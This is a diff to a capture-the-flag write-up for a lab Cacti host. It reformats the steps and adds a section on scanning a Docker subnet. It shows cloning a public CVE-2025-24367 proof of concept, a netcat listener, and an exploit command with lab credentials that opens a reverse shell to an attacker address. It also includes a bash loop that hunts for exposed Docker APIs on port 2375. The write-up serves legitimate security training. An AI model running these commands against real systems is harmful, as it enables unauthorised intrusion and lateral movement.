@@ -113,10 +113,14 @@ The steps for the reverse shell process on the attacker machine were quite strai
 #### 009: Reverse Shell
 
 Initially, the repo with the POC script was cloned.
-- `git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git`
+```bash
+git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
+```
 
 Then as described, a Netcat server was running locally on the attacker.
-- `nc -lvnp 4444` | switches allow listening mode on the specified port, with no DNS resolution and verbose output
+```bash
+nc -lvnp 4444 | switches allow listening mode on the specified port, with no DNS resolution and verbose output
+```
 
 A `venv` python virtual environment was created and activated, to enable `pip` installation of the POC required components.
 - `python3 -m venv venv`
@@ -124,7 +128,9 @@ A `venv` python virtual environment was created and activated, to enable `pip` i
 - `pip install requests beautifulsoup4`
 
 Once the installation has completed, the appropriate parameters (relevant findings) were passed to the `exploit.py` for the correct execution which allowed reverse connection.
- - `python3 exploit.py -u marcus -p wonderful1 -i <attacker_ip> -l 4444 -url http://cacti.monitorsfour.htb`
+```bash
+python3 exploit.py -u marcus -p wonderful1 -i <attacker_ip> -l 4444 -url http://cacti.monitorsfour.htb
+```
 
 {{< screenshots "shot-011" >}}
 
@@ -159,16 +165,32 @@ Furthermore, in /etc/hosts an entry showed a self-mapping for a docker container
 {{< screenshots "shot-014" >}}
 
 ---
-#### 013: Docker API
+#### 013: Docker Reachability
 
 As described the victim machine being Windows, it was assumed that the host was a Windows machine.
 https://dev.to/nasrulhazim/how-to-access-your-localhost-api-from-docker-containers-7ai provided a brief guide towards accessing the Docker API through a container.
 `host.docker.internal` is a resolution which allows access to a host machine, specifically if it is Windows or macOS.
 A probe was made to `host.docker.internal` with the use of `curl`, and the name resolution resolved to `192.168.65.254` on `port 80`.
-Essentially, the command returned an output that described the container has access to the host's nginx server. 
-- `curl -v http://host.docker.internal` | switch sets `curl` to verbose-mode
+Essentially, the command returned an output that described the container has network access to the host's nginx server. 
+```bash
+curl -v http://host.docker.internal | switch sets `curl` to verbose-mode
+```
 
 {{< screenshots "shot-015" >}}
+
+---
+#### 014: Subnet Scan
+
+Request to `host.docker.internal` resolved to an IP with the last octet `.254`, meaning it was the Docker bridge network gateway.
+Thus, the next step was a scan on the entire `/24` subnet for potential hosts that may expose Docker API.
+A simple Bash script has enabled a comprehensive subnet scan utilizing `curl`, and the host `192.168.65.7:2375` gave a response .
+```bash
+for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375" && curl -v --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null) & done; wait
+```
+- `loops through the 192.168.65.0/24 subnet and probes port 2375 on each host`
+- `identifies exposed Docker APIs by checking for ApiVersion in the response`
+- `prints and then verbosely queries any host that responds positively`
+- `executes scans in parallel and waits for all probes to finish`
 
 ---
 
